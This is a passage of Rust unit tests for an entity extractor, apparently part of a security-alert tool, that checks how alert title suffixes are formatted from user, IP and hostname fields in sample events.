    fn test_title_suffix_user_and_ip() {
        let extractor = EntityExtractor::new();
        let events = serde_json::json!({
            "user": "john.doe",
            "src_ip": "192.168.1.50"
        });
        let suffix = extractor.build_title_suffix_for(&events, SchemaId::Udm);
        assert_eq!(suffix, Some("john.doe@192.168.1.50".to_string()));
    }

    #[test]
    fn test_title_suffix_host_flow() {
        let extractor = EntityExtractor::new();
        let events = serde_json::json!({
            "src_host": "WORKSTATION-1",
            "dest_host": "DC-01"
        });
        let suffix = extractor.build_title_suffix_for(&events, SchemaId::Udm);
        assert_eq!(suffix, Some("WORKSTATION-1 → DC-01".to_string()));
    }

    #[test]
    fn test_title_suffix_ip_flow() {
        let extractor = EntityExtractor::new();
        let events = serde_json::json!({
            "src_ip": "192.168.1.50",
            "dest_ip": "10.0.0.5"
        });
        let suffix = extractor.build_title_suffix_for(&events, SchemaId::Udm);
        assert_eq!(suffix, Some("192.168.1.50 → 10.0.0.5".to_string()));
    }

    #[test]
    fn test_title_suffix_user_only() {
        let extractor = EntityExtractor::new();
        let events = serde_json::json!({
            "user": "svc_backup"
        });
        let suffix = extractor.build_title_suffix_for(&events, SchemaId::Udm);
        assert_eq!(suffix, Some("svc_backup".to_string()));
    }

    #[test]
    fn test_title_suffix_single_host() {
        let extractor = EntityExtractor::new();
        let events = serde_json::json!({
            "src_host": "SERVER-01"
        });
        let suffix = extractor.build_title_suffix_for(&events, SchemaId::Udm);
        assert_eq!(suffix, Some("SERVER-01".to_string()));
    }

    #[test]
    fn test_title_suffix_empty_events() {
        let extractor = EntityExtractor::new();
        let events = serde_json::json!({});
        let suffix = extractor.build_title_suffix_for(&events, SchemaId::Udm);
        assert_eq!(suffix, None);
    }

    #[test]
    fn test_title_suffix_from_array() {
        let extractor = EntityExtractor::new();
        let events = serde_json::json!([
            { "user": "admin", "src_host": "WS-001" },
            { "user": "admin", "src_host": "WS-002" }
        ]);
        // Should use first event's values
        let suffix = extractor.build_title_suffix_for(&events, SchemaId::Udm);
        assert_eq!(suffix, Some("admin@WS-001".to_string()));
    }
}
